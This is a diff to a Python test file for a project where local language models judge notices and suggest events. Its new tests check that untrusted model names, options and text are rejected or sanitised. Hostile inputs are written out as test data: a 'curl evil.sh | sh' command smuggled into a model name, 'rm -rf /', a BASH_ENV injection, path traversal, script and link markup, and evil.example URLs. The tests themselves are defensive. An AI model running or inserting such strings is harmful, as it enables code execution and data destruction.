@@ -392,7 +392,7 @@ def test_model_auto_follows_the_benchmark_and_falls_back(monkeypatch):
     monkeypatch.setattr(model_select.requests, "get", lambda url, timeout: Resp(
         {"use": {"model": "qwen3:4b", "options": {"think": False}}, "generated_at": "t"}))
     assert model_select.resolve() == {"model": "qwen3:4b", "think": "false", "source": "benchmark",
-                                      "benchmark_generated_at": "t"}
+                                      "digest": "", "benchmark_generated_at": "t"}
     assert config.LLM_MODEL == "qwen3:4b"
 
     def boom(url, timeout):
@@ -401,7 +401,7 @@ def test_model_auto_follows_the_benchmark_and_falls_back(monkeypatch):
     monkeypatch.setattr(model_select.requests, "get", boom)
     assert model_select.resolve()["source"] == "fallback" and config.LLM_MODEL == config.FALLBACK_MODEL
     monkeypatch.setattr(config, "LLM_MODEL", "gemma3:4b")
-    assert model_select.resolve() == {"model": "gemma3:4b", "think": config.LLM_THINK, "source": "pinned"}
+    assert model_select.resolve() == {"model": "gemma3:4b", "think": config.LLM_THINK, "source": "pinned", "digest": ""}
 
 
 def test_legacy_judgments_are_backfilled_not_rejudged(tmp_path):
@@ -474,9 +474,12 @@ def test_event_status_filtering(tmp_path, monkeypatch):
          "origin": "llm-memory"},
     ]}), encoding="utf-8")
     p = make_profile(tmp_path, events_file="ev.json")
-    assert [e["label"] for e in p.events()] == ["a", "b", "e"]  # ungrounded suggestion "d" never used
-    assert [e["label"] for e in p.events(include_suggested=False)] == ["a", "e"]
-    near = [{**e, "offset_months": 0} for e in p.events()]
+    # Default: only verified events reach the judge (suggestions come from editable sources).
+    assert [e["label"] for e in p.events()] == ["a", "e"]
+    # A profile that opts in also gets the grounded suggestion "b"; the ungrounded "d" never.
+    opted = make_profile(tmp_path, events_file="ev.json", events_include_suggested=True)
+    assert [e["label"] for e in opted.events()] == ["a", "b", "e"]
+    near = [{**e, "offset_months": 0} for e in opted.events()]
     assert "[unverified suggestion]" in "\n".join(
         f"{e['label']}" + (" [unverified suggestion]" if e["status"] == "suggested" else "") for e in near)
 
@@ -802,3 +805,91 @@ def test_manual_texts_and_years_kept(tmp_path, monkeypatch):
     table = translate.lookup(store, texts, "pt")
     assert table == {"Synthetic notices": "Autos sintéticos", "Other text": "traduzido"}
     assert calls == ["Other text"]  # the model never sees the hand-written one
+
+
+def test_untrusted_model_names_and_text_are_contained(monkeypatch):
+    """What comes from the benchmark or from a model never reaches a shell or an issue as is."""
+    from src import model_select, safety
+
+    class Resp:
+        def __init__(self, data): self.data = data
+        def json(self): return self.data
+
+    monkeypatch.setattr(config, "LLM_MODEL", "auto")
+    monkeypatch.setattr(config, "LLM_THINK", "")
+    for use in ({"model": 'x"; curl evil.sh | sh; "'}, {"model": "qwen3:4b\nBASH_ENV=/tmp/x"},
+                {"model": "qwen3:4b", "backend": "llamacpp"}, {"model": "qwen3:4b", "digest": "not-a-digest"},
+                {"model": "qwen3:4b", "options": {"think": "true; rm -rf /"}}):
+        monkeypatch.setattr(config, "LLM_MODEL", "auto")  # resolve() writes the choice back to config
+        monkeypatch.setattr(config, "LLM_THINK", "")
+        monkeypatch.setattr(model_select.requests, "get", lambda url, timeout, u=use: Resp({"use": u}))
+        assert model_select.resolve()["source"] == "fallback", use
+    assert safety.valid_model("qwen3:4b") and safety.valid_model("gemma3:4b-it-q4_K_M")
+    assert not safety.valid_model("qwen3:4b; ls") and not safety.valid_model("../../etc")
+    md = safety.safe_markdown("See [here](http://evil) ![x](http://t.gif) @someone #12 <script>| x\nnext")
+    assert "](" not in md and "<script>" not in md and "@someone" not in md and "#12" not in md
+    assert "|" not in md and "\n" not in md and "http://" not in md
+    assert len(safety.clean_text("a" * 10000, 100)) < 110
+    assert judge.parse_response(json.dumps({"category": "SP", "confidence": 1, "reasoning": "r\x00‮" * 2000}),
+                                {"SP": ""})["reasoning"].count("\x00") == 0
+
+
+def test_artifact_from_the_analysis_job_is_checked(tmp_path):
+    """The job that writes only accepts this profile's data and results, well formed."""
+    from src import safety
+    src, root = tmp_path / "artifact", tmp_path / "repo"
+    good = src / "results" / "p" / "judgments.json"
+    good.parent.mkdir(parents=True)
+    good.write_text(json.dumps({"notices:2020-01": {"category": "SP", "model": "qwen3:4b",
+                                                    "runs": [{"category": "SP", "reasoning": "ok"}]}}))
+    (src / "chain.json").write_text(json.dumps({"pending_after": 3, "rejudge_before": "2026-10-01T10:00:00+00:00"}))
+    assert safety.accept_artifact(src, root, "p", {"SP", "DQE"}) == ["results/p/judgments.json"]
+    assert (root / "results" / "p" / "judgments.json").exists()
+    assert safety.read_chain(src) == {"pending_after": 3, "rejudge_before": "2026-10-01T10:00:00+00:00"}
+
+    for rel, content in [(".github/workflows/x.yml", "on: push"), ("src/judge.py", "import os"),
+                         ("results/other/judgments.json", "{}")]:
+        bad = src / rel
+        bad.parent.mkdir(parents=True, exist_ok=True)
+        bad.write_text(content)
+        with pytest.raises(ValueError, match="unexpected files"):
+            safety.accept_artifact(src, root, "p", {"SP", "DQE"})
+        bad.unlink()
+    good.write_text(json.dumps({"notices:2020-01": {"category": "HACK", "runs": []}}))
+    with pytest.raises(ValueError, match="unknown category"):
+        safety.accept_artifact(src, root, "p", {"SP", "DQE"})
+
+
+def test_workflow_scripts_never_paste_expressions():
+    """Values from inputs, data or other steps reach the shell through the environment, never
+    pasted into a script with ${{ }} (GitHub Actions script injection; SECURITY.md)."""
+    import yaml
+    files = list((config.ROOT / ".github").rglob("*.yml"))
+    assert files
+    offenders = []
+    for f in files:
+        doc = yaml.safe_load(f.read_text(encoding="utf-8"))
+        steps = [s for job in (doc.get("jobs") or {}).values() for s in job.get("steps", [])]
+        steps += (doc.get("runs") or {}).get("steps", [])
+        offenders += [f"{f.name}: {s.get('name', s['run'][:40])}" for s in steps if "${{" in str(s.get("run", ""))]
+    assert not offenders, offenders
+
+
+def test_event_suggestions_may_only_be_appended():
+    from src import safety
+    old = {"_comment": "c", "events": [{"month": "2019-01", "kind": "political", "label": "x", "status": "verified"}]}
+    good = {"month": "2020-03", "kind": "external", "label": "Pandemia", "status": "suggested",
+            "origin": "llm+wikipedia", "source": "https://pt.wikipedia.org/wiki/2020_no_Brasil (Wikipedia)",
+            "evidence": "e", "relevance": "r", "relevance_score": 0.8, "suggested_by": "qwen3:4b"}
+    assert safety.check_events_update(old, {**old, "events": old["events"] + [good]}) == [good]
+    bad_cases = [
+        {**old, "events": [{**old["events"][0], "status": "rejected"}, good]},          # edits an entry
+        {**old, "_comment": "changed", "events": old["events"] + [good]},               # other fields
+        {**old, "events": old["events"] + [{**good, "status": "verified"}]},            # self-verified
+        {**old, "events": old["events"] + [{**good, "source": "https://evil.example/x"}]},
+        {**old, "events": old["events"] + [{**good, "run": "curl evil"}]},              # unknown field
+        {**old, "events": old["events"] + [{**good, "label": "x" * 1000}]},
+    ]
+    for new in bad_cases:
+        with pytest.raises(ValueError):
+            safety.check_events_update(old, new)
